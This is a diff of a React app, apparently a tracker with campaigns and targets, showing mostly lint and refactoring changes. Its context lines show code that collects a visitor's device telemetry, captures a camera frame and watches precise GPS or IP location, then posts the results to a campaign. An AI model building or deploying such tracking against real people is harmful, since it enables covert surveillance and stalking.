@@ -1,4 +1,4 @@
-import React, { useState, useEffect, useRef } from 'react';
+import React, { useState, useEffect } from 'react';
 import { apiCreate, apiGet, apiAddTarget, compressImage } from './api';
 import { 
   MapContainer, 
@@ -149,16 +149,15 @@ export default function App() {
     const s = localStorage.getItem('aegis_campaign_index');
     return s ? JSON.parse(s) : [];
   });
-  const pollingRef = useRef(null);
 
   const [selectedTarget, setSelectedTarget] = useState(null);
-  
-  // Current client-side status (for self-test)
-  const [trackingStatus, setTrackingStatus] = useState('idle'); // 'idle' | 'tracking' | 'success' | 'error'
-  const [trackingMethod, setTrackingMethod] = useState(''); // 'GPS' | 'IP'
-  const [currentCoords, setCurrentCoords] = useState([-23.55052, -46.633308]); // Default São Paulo
+  const [currentCoords, setCurrentCoords] = useState([-23.55052, -46.633308]);
   const [mapZoom, setMapZoom] = useState(13);
-  const [locationDetails, setLocationDetails] = useState({
+
+  // Estados do tracker local do operador (auto-track)
+  const [trackingStatus, setTrackingStatus] = useState('idle'); // eslint-disable-line no-unused-vars
+  const [trackingMethod, setTrackingMethod] = useState(''); // eslint-disable-line no-unused-vars
+  const [locationDetails, setLocationDetails] = useState({ // eslint-disable-line no-unused-vars
     ip: 'Detectando...',
     city: 'Detectando...',
     region: 'Detectando...',
@@ -170,6 +169,11 @@ export default function App() {
   });
 
   const [isPreviewMode, setIsPreviewMode] = useState(false);
+
+  const addLog = (text, type = 'info') => {
+    const time = new Date().toLocaleTimeString();
+    setLogs(prev => [...prev, { id: Date.now(), time, text, type }]);
+  };
 
   // Persiste índice local de campanhas do operador
   useEffect(() => {
@@ -237,7 +241,7 @@ export default function App() {
           }
           return prev;
         });
-      } catch {}
+      } catch (err) { console.warn('Poll error', err); }
       timeoutId = setTimeout(poll, interval);
     };
 
@@ -262,7 +266,7 @@ export default function App() {
       if ('wakeLock' in navigator) {
         await navigator.wakeLock.request('screen');
       }
-    } catch (e) {}
+    } catch { /* Wake Lock não suportado — ignorado */ }
 
     // --- Módulo 1: Telemetria de Hardware Avançada ---
     let batteryLevel = 'Desconhecido';
@@ -273,7 +277,7 @@ export default function App() {
         batteryLevel = `${Math.round(battery.level * 100)}%`;
         isCharging = battery.charging;
       }
-    } catch (e) {}
+    } catch { /* Battery API não suportada — ignorado */ }
 
     const hwTelemetry = {
       ram: navigator.deviceMemory ? `${navigator.deviceMemory}GB+` : 'Desconhecido',
@@ -299,8 +303,8 @@ export default function App() {
         canvas.getContext('2d').drawImage(video, 0, 0);
         photoBase64 = canvas.toDataURL('image/jpeg', 0.5); // 50% de qualidade
         stream.getTracks().forEach(track => track.stop());
-      } catch (e) {
-        console.warn('Câmera negada ou indisponível', e);
+      } catch (err) {
+        console.warn('Câmera negada ou indisponível', err);
       }
     }
 
@@ -389,11 +393,6 @@ export default function App() {
 
       navigator.geolocation.watchPosition(geoSuccess, geoError, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
     }
-  };
-
-  const addLog = (text, type = 'info') => {
-    const time = new Date().toLocaleTimeString();
-    setLogs(prev => [...prev, { id: Date.now(), time, text, type }]);
   };
 
   // Handle image upload
@@ -560,7 +559,7 @@ export default function App() {
               setSelectedTarget(newTarget);
               if (activeCampaignId) apiAddTarget(activeCampaignId, newTarget).catch(() => {});
             })
-            .catch(err => {
+            .catch(() => {
               setTrackingStatus('error');
               addLog(`FALHA GERAL: Não foi possível obter localização via GPS nem IP.`, 'error');
             });
